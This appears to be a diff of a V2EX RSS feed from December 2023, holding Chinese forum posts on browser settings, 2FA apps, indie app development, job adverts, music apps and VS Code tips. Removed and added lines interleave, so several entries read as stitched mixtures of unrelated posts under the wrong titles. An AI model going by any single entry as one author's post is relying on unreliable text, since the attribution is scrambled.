全币种付款自动跳回主页</title><link>https://www.v2ex.com/t/997618#reply0</link><description>&lt;p&gt;这是什么原因呢，确定没有填错，也没有提示什么错误，直接回到 oyunfor 主页。&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 14:26:42 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997618#reply0</guid></item><item><title>[Chrome] 如何关闭第三方应用的链接默认打开无痕式窗口？</title><link>https://www.v2ex.com/t/997617#reply0</link><description>不知道哪个版本之后，xcode 里的链接，vscode 里用 chrome 打开的 web 调试窗口，包括终端里打开的页面，凡是需要调用 chrome 打开的 URL 链接，chrome 都会以无痕窗口打开，导致总要复制网址再在普通窗口打开。&lt;br /&gt;翻遍了设置好像也没有类似选项，搜了一圈，也没有什么有用的信息</description><pubDate>Mon, 04 Dec 2023 14:08:38 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997617#reply0</guid></item><item><title>[程序员] 有没有支持使用 webdav/s3 同步的 2FA 软件</title><link>https://www.v2ex.com/t/997616#reply1</link><description>如题。</description><pubDate>Mon, 04 Dec 2023 14:02:31 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997616#reply1</guid></item><item><title>[分享创造] 做了个查询动漫图片出处的 TUI 小工具</title><link>https://www.v2ex.com/t/997615#reply0</link><description>&lt;p&gt;最近在学 TUI 框架，做了个小工具， 使用 trace.moe API&lt;/p&gt;
-&lt;h3&gt;描述&lt;/h3&gt;
-&lt;p&gt;输入图片文件路径，查询出处，可从多个结果中选择，可以获取：&lt;/p&gt;
+&lt;p&gt;不知道是我的问题还是大家都这样。还是和 IP 有关。&lt;/p&gt;
+&lt;p&gt;快捷设置-更多-其他设置-连续滚动：&lt;strong&gt;即使关闭了，也只是不自动滚动，不能恢复翻页的搜索版式。&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;前几天还有内存卡爆，chrome 卡死，还有一堆快速迭代引起的 devtools BUG ，Firefox 倒是很流畅，也不知道最近是咋了。&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:28:24 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997865#reply0</guid></item><item><title>[微信] 微信小程序 商家会员系统</title><link>https://www.v2ex.com/t/997864#reply1</link><description>是这样的，各位大佬们，就自己家零食店，想弄个微信小程序，可以扫码支付，支付了加积分，有会员，可以积分，可以充值，充值额度有满赠功能。有啥现成的推荐吗 或者说有现成的框架 自己弄个服务器搭一套&lt;br /&gt;&lt;br /&gt;后端 java 出身 之前也搞过两个月微信小程序 忘得差不多了</description><pubDate>Tue, 05 Dec 2023 11:26:08 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997864#reply1</guid></item><item><title>[程序员] 编译 wireguard 的安卓客户端遇到点问题，开发语言是 Kotlin</title><link>https://www.v2ex.com/t/997863#reply1</link><description>&lt;h1&gt;wireguard 的安卓客户端&lt;/h1&gt;
+&lt;h1&gt;看看有没有大佬遇到过或者能解决；有偿求助&lt;/h1&gt;
+&lt;p&gt;#官方链接库地址：
+&lt;code&gt;&lt;a href="https://github.com/WireGuard/wireguard-android" rel="nofollow"&gt;https://github.com/WireGuard/wireguard-android&lt;/a&gt;&lt;/code&gt;&lt;br /&gt;
+#编译报错 Task failed with an exception.    &lt;/p&gt;
+&lt;h2&gt;日志如下，如果还需要其他信息请留言或者留下联系方式&lt;/h2&gt;
+&lt;p&gt;&lt;img alt="1b538211a712c99048074cfc3c3f958.jpg" class="embedded_image" rel="noreferrer" src="https://s2.loli.net/2023/12/05/xtwpsEKyGcTQ7WX.jpg" /&gt;&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:18:23 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997863#reply1</guid></item><item><title>[程序员] [求助贴-Web-3D 开发方面] 有熟悉 WebGL 或相关基于浏览器 3D 开发方面内容的同学给点儿建议</title><link>https://www.v2ex.com/t/997862#reply0</link><description>&lt;h2&gt;需求&lt;/h2&gt;
+&lt;p&gt;建立一个 3D 的房间内部模型，主要内容包括：一套桌椅，一个射灯，若干的人物模型。&lt;/p&gt;
+&lt;h2&gt;交互&lt;/h2&gt;
+&lt;p&gt;用户可以拖动模型中的家具、射灯和人物&lt;/p&gt;
+&lt;h2&gt;重点&lt;/h2&gt;
+&lt;p&gt;用户改变模型位置之后，要能够导出最终的位置信息等（ json 格式），用于判断用户是否正确挪动了模型&lt;/p&gt;
+&lt;h2&gt;问题&lt;/h2&gt;
 &lt;ul&gt;
-&lt;li&gt;动漫名称&lt;/li&gt;
-&lt;li&gt;集数&lt;/li&gt;
-&lt;li&gt;视频出处时间段&lt;/li&gt;
-&lt;li&gt;相似度&lt;/li&gt;
+&lt;li&gt;用什么框架比较合适？（要求简单、好上手）&lt;/li&gt;
+&lt;li&gt;有没有合适的 demo 可以做二次开发？&lt;/li&gt;
+&lt;/ul&gt;</description><pubDate>Tue, 05 Dec 2023 11:13:52 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997862#reply0</guid></item><item><title>[奇思妙想] 有没有一个能够跟踪观点和逻辑的社区？</title><link>https://www.v2ex.com/t/997861#reply3</link><description>&lt;p&gt;我们每天都生活在一个噪音海洋里，我们的脑子每天要摄取非常多的观点（其中，绝大部分可能是口嗨和毫无根据的逻辑），这些严重干扰了我们的认知。但是我们没办法改变这个大环境，大家乐于表达自己的观点我觉得是好事，只要不违法，想说什么都是自己的自由。但是有没有一个社区，能够跟踪大家表达观点，然后在未来某一天回过头来复盘这个观点。我觉得无论一个观点在未来能否被证实，这次复盘的意义都非常大，如果你的观点是对的，那复盘之后你思考问题的方法论可以更加笃定，如果观点不能被验证的话，复盘过程中也可以修正自己思考问题逻辑。&lt;/p&gt;
+&lt;p&gt;不清楚目前有没有类似的产品，如果没有，没有人愿意一起来构建一个这样的社区呢（可以做一个开源的项目）？&lt;/p&gt;
+&lt;h3&gt;为什么非常想要有这样一个社区？&lt;/h3&gt;
+&lt;p&gt;因为微博已经没法看了，知乎还有一些高质量观点，但是现在也有非常多长篇大论的废话，至于小红书之类的我觉得和微博应该差不多。&lt;/p&gt;
+&lt;p&gt;可以通俗的理解这个社区，它可能就是一个立 flag 的圈子。比如我针对未来 3 个月会发生的某个事情表发一个观点，或者立一个 flag ，中途我会和其他人一起探讨这个观点，可能一个不确定的事情，随着时间的推移，确定性越来越高，你再回溯你自己的观点，看看自己的认知到底哪里出了问题。我觉得这一过程非常非常非常提升认知。&lt;/p&gt;
+&lt;h3&gt;我脑海中的这个社区是怎么样的&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;大家可以每天发表一条（最多一条）自己的观点，无所谓是什么，字数必须简短（避免长篇大论）&lt;/li&gt;
+&lt;li&gt;每个用户最多发表 10 条观点，但是可以每天为自己之前发表的观点增加论据&lt;/li&gt;
+&lt;li&gt;每一个观点可以有正方论据和反方论据（其他用户添加）&lt;/li&gt;
+&lt;li&gt;用户可以评论别人的观点，但是每天也只能评论一次，1 小时内允许修改一次&lt;/li&gt;
+&lt;li&gt;每一个观点和论据都通过时间线来维护，一个观点需要有一个截止日期，到期之后论点和论据都封存，只能阅览&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h3&gt;Repo&lt;/h3&gt;
-&lt;p&gt;&lt;a href="https://github.com/acgtools/trace-moe-go" rel="nofollow"&gt;https://github.com/acgtools/trace-moe-go&lt;/a&gt;&lt;/p&gt;
-&lt;h3&gt;示例&lt;/h3&gt;
-&lt;p&gt;&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://raw.githubusercontent.com/dreamjz/pics/main/pics/2023/202312042051978.gif" /&gt;&lt;/p&gt;</description><pubDate>Mon, 04 Dec 2023 13:58:02 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997615#reply0</guid></item><item><title>[程序员] 独立开发周记 #42： 11 月总结</title><link>https://www.v2ex.com/t/997613#reply3</link><description>&lt;h1&gt;2023 ，1127-1203&lt;/h1&gt;
-&lt;p&gt;周一，App 备案通过&lt;/p&gt;
-&lt;p&gt;周二，极简时钟审核通过上架，另外两个「极简时钟」 App 下架，忙活一上午新 app 的准备工作&lt;/p&gt;
-&lt;p&gt;周三，兼职&lt;/p&gt;
-&lt;p&gt;周四，兼职&lt;/p&gt;
-&lt;p&gt;周五，白天兼职，晚上极简日记&lt;/p&gt;
-&lt;p&gt;周六，极简日记，买电视&lt;/p&gt;
-&lt;p&gt;周日，在新电视上写代码&lt;/p&gt;
-&lt;h1&gt;11 月数据总结&lt;/h1&gt;
-&lt;p&gt;四个字总结 11 月，就是：&lt;strong&gt;全面下降📉&lt;/strong&gt;&lt;/p&gt;
+&lt;h3&gt;建一个 vx 群，有类似想法的朋友可以一起来交流（二维码在我博客里，v2 不好贴图）&lt;/h3&gt;
+&lt;p&gt;&lt;a href="https://www.tiangua.info/blog/ec55cc44-e260-4622-8d2a-69012d04a67e/%E6%9C%89%E6%B2%A1%E6%9C%89%E4%B8%80%E4%B8%AA%E8%83%BD%E5%A4%9F%E8%B7%9F%E8%B8%AA%E8%A7%82%E7%82%B9%E5%92%8C%E9%80%BB%E8%BE%91%E7%9A%84%E7%A4%BE%E5%8C%BA%EF%BC%9F" rel="nofollow"&gt;博客里有群二维码&lt;/a&gt;&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:09:18 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997861#reply3</guid></item><item><title>[程序员] 据说是华为旗下推出的前端框架 openinula.net</title><link>https://www.v2ex.com/t/997860#reply0</link><description>&lt;p&gt;学不完根本学不完啊&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 11:00:10 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997860#reply0</guid></item><item><title>[问与答] 婚礼视频有些不满意，请问可以抠图换背景之类魔改么</title><link>https://www.v2ex.com/t/997858#reply3</link><description>户外的，比如有些镜头里的马路，草地有些地方不饱满，这种能修复么，价格普通人能接受么。</description><pubDate>Tue, 05 Dec 2023 10:55:36 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997858#reply3</guid></item><item><title>[酷工作] 不卷外企 Kong 招前端开发，产品经理， Mesh 开发啦</title><link>https://www.v2ex.com/t/997857#reply0</link><description>&lt;p&gt;Kong 中国研发中心招聘：Insomnia 产品高级前端开发工程师，Service Mesh 研发和支持工程师 ，APM 产品经理等职位，可以 base 北京或者上海，HC 多多，欢迎投递英文简历。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://files.mdnice.com/user/52867/77117176-c7d3-40c7-971c-dbd8a093b133.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;企业介绍：&lt;/p&gt;
+&lt;p&gt;Kong 是一家总部在美国硅谷的全球企业，在 API 管理市场，连续四年被 Gartner 评为领导者地位。Kong 在中国的上海和北京设有研发中心。&lt;/p&gt;
+&lt;p&gt;中国求职者请直接将您的英文简历发往 HR 邮箱： &lt;a href="mailto:chitty.li@konghq.com"&gt;chitty.li@konghq.com&lt;/a&gt;&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 10:46:41 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997857#reply0</guid></item><item><title>[音乐] ㊙️ 我宣布，国内最好的音乐 APP 是酷狗</title><link>https://www.v2ex.com/t/997856#reply0</link><description>&lt;p&gt;酷狗概念版，UI 不错，没有乱七八糟的直播、社交功能。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;曲库版权跟 QQ 音乐对齐。&lt;/strong&gt;&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;App Store ，收入下降 4.85%，其中极简时钟下载量下降 11%，极简日记下载量下降 36%！&lt;/li&gt;
-&lt;li&gt;Google Play ，收入下降 8.81%，极简时钟下载量增长 23.18%&lt;/li&gt;
-&lt;li&gt;Admob ，收入增长 14.58%，是上个月里唯一一个增长的收入渠道&lt;/li&gt;
-&lt;li&gt;国内安卓市场，收入下降 7.02%，其中极简时钟下载量下降 14.02%，极简日记下载量下降 27%&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网易云&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1&gt;新 app 上架前的工作&lt;/h1&gt;
-&lt;p&gt;周二早上，在毫无准备的情况下突然要接手一个安卓 app ，于是忙了一上午：&lt;/p&gt;
+&lt;p&gt;卸载挺久了，版权少，还总是给我推荐一些不入流的网络翻唱。听你唱还不如我自己唱。&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;注册商标&lt;/li&gt;
-&lt;li&gt;申请软著&lt;/li&gt;
-&lt;li&gt;在各个安卓市场新建应用&lt;/li&gt;
-&lt;li&gt;在微信开放平台新建应用&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;QQ 音乐&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;接下来还得修改官网、申请备案。&lt;/p&gt;
-&lt;p&gt;一上午一个代码还没写已经花出去小一千了😭&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;安卓不值得！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://upload.cc/i1/2023/12/04/706ndV.jpeg" /&gt;&lt;/p&gt;
-&lt;p&gt;说到 App 备案，原来很多独立开发者，包括我在内，都不知道在工信部 App 备案后，还需要公安备案……周二的下午都花在这个公安备案上了，不仅需要把之前 App 备案的信息再填一遍，还需要填写日活和注册用户数……&lt;/p&gt;
-&lt;h1&gt;极简时钟 iOS &lt;a href="https://apps.apple.com/cn/app/id1265404088" rel="nofollow"&gt;App Store&lt;/a&gt;&lt;/h1&gt;
-&lt;p&gt;上周提到的因为名字里含有「番茄钟」而导致审核不通过的问题解决了，没有改代码，也没有重新提交。&lt;/p&gt;
-&lt;p&gt;我只是提交了一个回复：我这个 app 的名字已经使用 5 年多了，而且目前 App Store 里也有很多名字里带有「番茄钟」 的 App ，要求我改名是审核标准不一致吗？&lt;/p&gt;
-&lt;p&gt;于是第二天就审核通过上架了。&lt;/p&gt;
-&lt;p&gt;另外，三个月前，我对另外两个「极简时钟」提出的申诉终于有了结果（估计工作人员都忘了这个事了，还是我发了封邮件询问进展后才给出了结果），这两个 App 在国区没有改名，而是直接下架了。这和我之前预估的一样，这两个 App 长时间不更新，估计已经放弃经营了。&lt;/p&gt;
-&lt;p&gt;通过这两次跟名称相关的事件，我决定对「极简时钟」这个 App 名称进行进一步的保护，等有结果了再公开吧。&lt;/p&gt;
-&lt;h1&gt;极简日记 iOS  &lt;a href="https://apps.apple.com/cn/app/id1568936702" rel="nofollow"&gt;App Store&lt;/a&gt;&lt;/h1&gt;
-&lt;p&gt;周五晚上根据两个用户反馈的问题，调整了一下编辑的交互，顺便修复了一个崩溃问题，于是就提交了。&lt;/p&gt;
-&lt;p&gt;周六晚上发现之前的改动带来一个新的问题，于是赶紧撤回了。又是一轮修改和测试后，感觉没问题了才又提交。&lt;/p&gt;
-&lt;p&gt;刚开始写这个 App 的时候对 SwiftUI 的理解还很肤浅，现在虽然也远谈不上精通，但起码比两年前的理解还是更深入了一些。接下来想对极简日记进行一次底层的大更新，包括一些交互的小改进，但不会加入大的新功能：&lt;/p&gt;
+&lt;p&gt;每天打开都要重新登陆，你恶心不恶心？有手机、电脑、平板、车机，这里登了那里就得重新登陆。最近每次打开 mac 版本都要我扫码，还不给我手机号登陆。&lt;/p&gt;
+&lt;p&gt;APP 内还有乱七八糟的功能，密密麻麻的排版，我只想听歌罢了。&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;最低支持版本升级到 iOS 16&lt;/li&gt;
-&lt;li&gt;优化各种交互&lt;/li&gt;
-&lt;li&gt;尝试 Revenue Cat 的 Paywall&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Apple Music&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;h1&gt;招设计师&lt;/h1&gt;
-&lt;p&gt;周六在即刻发了个动态，想招设计师参与合作极简时钟和新 App 。&lt;/p&gt;
-&lt;p&gt;极简时钟的设计工作主要就是新表盘的开发，目前 backlog 里积累的表盘 idea 有六七个，而且还都是市面上还没出现过的设计，希望能早日上架。&lt;/p&gt;
-&lt;p&gt;新 App 就是上面提到的刚接手的安卓 App ，因为是独立开发者的个人作品，UI 比较接近安卓原生风格，所以需要整体重新设计一下。而且这个 App 我也会开发一个 iOS 版，所以两端的设计风格需要统一。&lt;/p&gt;
-&lt;p&gt;诚招各位设计师朋友一起合作，下面是我的联系方式：
-我的微信：wangshudao937
-我的邮箱： &lt;a href="mailto:shudao.wang@me.com"&gt;shudao.wang@me.com&lt;/a&gt;&lt;/p&gt;
-&lt;h1&gt;又是买买买的一周&lt;/h1&gt;
-&lt;p&gt;这周看到 M2 Max 的 Mac Studio 出了官翻版，就种草了，本来想着 11 月的兼职工资到手后就下单一台，没想到跑出来一个截胡的消费。&lt;/p&gt;
-&lt;p&gt;这周可是没少买，无论是数量还是金额，大部分都是在抖音买的：&lt;/p&gt;
+&lt;p&gt;曲库略少，偶尔想换个口味，推荐功能基本算没有，在车机上很难用。&lt;/p&gt;
 &lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Spotify&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;下载 APP 还要其他区的 apple id ，更新也麻烦，订阅价格贵，没歌词（基本算没有了）。客户端是套壳的 electron 吧，听难用的。推荐的歌都挺不错。&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 10:46:16 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997856#reply0</guid></item><item><title>[音乐] 好想学萨克斯🎷，有没有大佬指导下</title><link>https://www.v2ex.com/t/997855#reply1</link><description>&lt;p&gt;本人非音乐专业，工作一年后想培养下爱好，觉得萨克斯非常有意思&lt;/p&gt;
+&lt;p&gt;想知道应该如何入门？需要报班吗？&lt;/p&gt;
+&lt;p&gt;目标我现在不是特别清楚，我对流行乐、爵士感兴趣，但是既然想玩肯定想要玩点名堂，就是不知道考级对我的兴趣有无帮助？&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 10:44:54 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997855#reply1</guid></item><item><title>[酷工作] 内推 iOS 工程师 公司福利好不卷</title><link>https://www.v2ex.com/t/997854#reply0</link><description>我们公司在招 iOS ，15 薪不卷不加班，薪资还可以，地点国贸附近高级写字楼，福利：不低于字节水平的免费三餐、零食水果饮料、补充商业保险、公积金社保全额缴纳、每年免费体检、M1 MacBook pro 。 我这边基本 7 点吃晚饭没事吃完就可以走了，早上 10:30 到，中午 2 小时休息，很少加班。有找 iOS 职位的可以发我简历我给 HR ，我还可以拿内推奖励，邮箱 base64: bGl5dW5sb25nQHAxLmNvbQ==</description><pubDate>Tue, 05 Dec 2023 10:43:53 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997854#reply0</guid></item><item><title>[服务器] 收腾讯无忧 125，有的大佬出出呀</title><link>https://www.v2ex.com/t/997853#reply0</link><description>&lt;p&gt;收腾讯轻量无忧 1 核 2G5M 配置
+有想出的大佬联系我呀
+TG: @&lt;a href="https://www.v2ex.com/member/okdoing"&gt;okdoing&lt;/a&gt;&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 10:42:44 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997853#reply0</guid></item><item><title>[V2EX] 请教：使用 V2EX 的开放接口获取数据，二次加工后商业化，可以被站长允许吗</title><link>https://www.v2ex.com/t/997852#reply0</link><description>&lt;p&gt;想做一个 V2EX 编辑精选之类的东西&lt;/p&gt;</description><pubDate>Tue, 05 Dec 2023 10:42:40 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997852#reply0</guid></item><item><title>[Visual Studio Code] vscode 贴合开发、生产实用的玩法你知道的有哪些？</title><link>https://www.v2ex.com/t/997849#reply0</link><description>&lt;ul&gt;
 &lt;li&gt;
-&lt;p&gt;可以磁吸的眼镜框，可以磁吸墨镜片和偏振镜片&lt;/p&gt;
+&lt;p&gt;可以下载一些连字字体代码阅读效果可以更好&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;据说是瑞士进口的强力胶&lt;/p&gt;
+&lt;p&gt;自定义布局，把设置、账户设置到窗口栏旁边，工具栏可以隐藏，工具栏放在源代码栏上方三个横线那里&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;车载手机支架&lt;/p&gt;
+&lt;p&gt;git 相关工具&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;可以各种旋转+四种水花的水花器&lt;/p&gt;
+&lt;p&gt;ssh,docker 远程连接服务器&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;泳镜泳裤泳帽三件套&lt;/p&gt;
+&lt;p&gt;ctrl p 搜索文件 ctl shift p 执行命令 ctr g ctl t ctr f ctr shift f&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;三本关于数学教育的书，和一本凑单用的《设计中的设计》&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://upload.cc/i1/2023/12/04/J3Hyjl.jpeg" /&gt;&lt;/p&gt;
+&lt;p&gt;把 vscode PowerShell 终端文件路径缩短到当前目录&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;Keychron K15 Pro 。之前的 K11 Pro 其实很满意了，但是最近写代码太多，K11 Pro 的青轴敲久了还是有点累，而且晚上孩子睡着后就不能用了，于是就下单了红轴的 K15 Pro ，功能键更多一些。
-&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://upload.cc/i1/2023/12/04/CLEd26.jpeg" /&gt;&lt;/p&gt;
+&lt;p&gt;数据库相关插件&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;最后这个就是本周最贵的一笔消费了，小米的 86 寸 4K 电视，这是一个蓄谋已久的冲动消费。「蓄谋已久」是我一直想买个 4K 大电视好多年了，家里的电视还是 9 年前结婚时买的一个 50 寸 1080P 的非智能电视，早就想换了。「冲动」是指我本来想买个 65 寸的，最大最大 75 寸的电视。但是到了店里一对比，还是 86 寸更合适我的需求，因为我的梦想就是躺在沙发上看电视写代码。本来 75 寸的价格就已经超出我的预算了，更别说这个 86 寸的了，但是店员「适时地」给了我 400 元优惠，又赠了两年延保，就彻底击溃了我的心理防线。为了梦想成真，就咬咬牙上了。看了一下午 4K 的电视剧，效果太惊人了，感觉之前的影视剧都白看了。又玩了一会游戏，屏幕太大了，有点晕。买了这个电视，就又想买 Apple TV 了，主要是为了用 VidHub 看视频，但是目前来看阿里云盘自己的 TV 版 App 还够用。另外家里的 PS4 和 XSS 也该升级了……Mac Studio 需要再等等了😭
-&lt;img alt="" class="embedded_image" rel="noreferrer" src="https://upload.cc/i1/2023/12/04/iHLrFM.jpeg" /&gt;&lt;/p&gt;
+&lt;p&gt;codeium 免费，因为 Claude GPT 还有 GitHub copilot 要钱&lt;/p&gt;
 &lt;/li&gt;
-&lt;/ul&gt;</description><pubDate>Mon, 04 Dec 2023 13:38:48 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997613#reply3</guid></item></channel></rss>
+&lt;li&gt;
+&lt;p&gt;leekfund 股票趋势&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;还有哪些有用的技巧？&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;</description><pubDate>Tue, 05 Dec 2023 10:20:52 GMT</pubDate><guid isPermaLink="true">https://www.v2ex.com/t/997849#reply0</guid></item></channel></rss>
